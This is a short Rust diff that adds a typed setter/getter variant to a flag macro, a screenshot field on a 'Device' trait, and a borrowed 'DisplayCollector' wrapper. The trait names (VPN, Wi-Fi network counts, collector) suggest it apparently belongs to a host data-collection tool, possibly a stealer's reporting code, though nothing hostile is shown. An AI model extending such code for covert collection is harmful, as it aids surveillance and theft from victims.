@@ -2,6 +2,7 @@
 
 extern crate alloc;
 
+use alloc::vec::Vec;
 use core::fmt::{Display, Formatter};
 use indoc::indoc;
 
@@ -21,13 +22,20 @@ macro_rules! increase_count {
     };
 }
 
-#[allow(unused_macros)]
 macro_rules! flag {
     ($name:ident) => {
         paste::paste! {
             fn [<set_ $name>](&self);
 
             fn [<is_ $name>](&self) -> bool;
+        }
+    };
+
+    ($name:ident, $ty:ty) => {
+        paste::paste! {
+            fn [<set_ $name>](&self, val: $ty);
+
+            fn [<get_ $name>](&self) -> Option<$ty>;
         }
     };
 }
@@ -62,6 +70,7 @@ pub trait Vpn: Send + Sync {
 
 pub trait Device: Send + Sync {
     increase_count!(wifi_networks);
+    flag!(screenshot, Vec<u8>);
 }
 
 pub trait Collector: Send + Sync {
@@ -82,9 +91,9 @@ pub trait Collector: Send + Sync {
     fn get_device(&self) -> &Self::Device;
 }
 
-pub struct DisplayCollector<T: Collector>(pub T);
+pub struct DisplayCollector<'a, T: Collector>(pub &'a T);
 
-impl<T: Collector> Display for DisplayCollector<T> {
+impl<T: Collector> Display for DisplayCollector<'_, T> {
     fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
         write!(
             f,
